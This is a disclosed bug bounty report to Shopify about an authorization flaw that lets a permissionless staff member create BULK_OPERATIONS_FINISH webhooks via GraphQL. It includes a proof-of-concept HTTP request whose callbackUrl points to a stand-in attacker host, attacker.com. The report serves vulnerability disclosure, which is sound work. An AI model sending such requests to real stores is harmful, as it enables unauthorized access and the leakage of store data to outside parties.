# Staff  can use BULK_OPERATIONS_FINISH webhook topic using Graphql without permissions all

## Report Details
- **Report ID**: 1350095
- **URL**: https://hackerone.com/reports/1350095
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-09-24T00:40:48.011Z
- **Disclosed**: 2021-12-04T01:04:09.592Z

## Reporter
- **Username**: yinvi777
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
I am reporting this because it looks like an authorization bug in GraphQL.
A Staff member with no  permissions on a Shopify Store may be able to create Webhooks with the webhookSubscriptionCreate mutation on
BULK_OPERATIONS_FINISH webhook topic.

POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
Host: yinvi-nacho-2.myshopify.com
Connection: close

{
"operationName": "webhookSubscriptionCreate",
"variables": {
"topic": "BULK_OPERATIONS_FINISH",
"webhookSubscription": {
"callbackUrl": "https://attacker.com"
}
},
"query": "mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!) {\r\n  webhookSubscriptionCreate(topic: $topic, webhookSubscription: $webhookSubscription) {\r\n    userErrors {\r\n      field\r\n      message\r\n    }\r\n    webhookSubscription {\r\n      id\r\n    }\r\n  }\r\n}"
}

## Impact

Staff  with no permissions may be able to access or perform unauthorized actions  on  bulk-operation  https://shopify.dev/api/usage/bulk-operations/queries

## Attachments
No attachments
